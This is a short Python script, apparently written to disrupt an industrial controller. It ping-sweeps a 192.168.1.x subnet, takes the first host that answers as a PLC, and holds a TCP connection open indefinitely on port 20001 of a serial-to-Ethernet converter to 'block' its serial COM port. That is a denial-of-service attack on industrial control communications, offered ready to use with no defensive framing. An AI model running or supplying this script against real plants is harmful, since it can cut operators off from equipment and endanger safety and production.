import socket
import subprocess
import time

# Function to find the IP address of the PLC
def find_plc_ip():
    # Assuming the PLC is on the same network and responds to ping
    # This is a simple method and may need to be adjusted based on the actual network setup
    network = "192.168.1."  # Change this to your network range
    for i in range(1, 255):
        ip = f"{network}{i}"
        response = subprocess.run(['ping', '-n', '1', '-w', '100', ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if response.returncode == 0:
            print(f"PLC found at IP: {ip}")
            return ip
    print("PLC not found on the network.")
    return None

# Function to block the serial COM port
def block_serial_com(ip, port):
    try:
        # Create a socket object
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the serial to Ethernet converter
        sock.connect((ip, port))
        print(f"Connected to {ip} on port {port}. Serial COM port is now blocked.")
        # Hold the connection open indefinitely
        while True:
            time.sleep(1)
    except Exception as e:
        print(f"Failed to block serial COM port: {e}")
    finally:
        sock.close()

# Main function
def main():
    # Find the PLC IP address
    plc_ip = find_plc_ip()
    if plc_ip:
        # Block the serial COM port
        block_serial_com(plc_ip, 20001)  # Change the port number as needed

if __name__ == "__main__":
    main()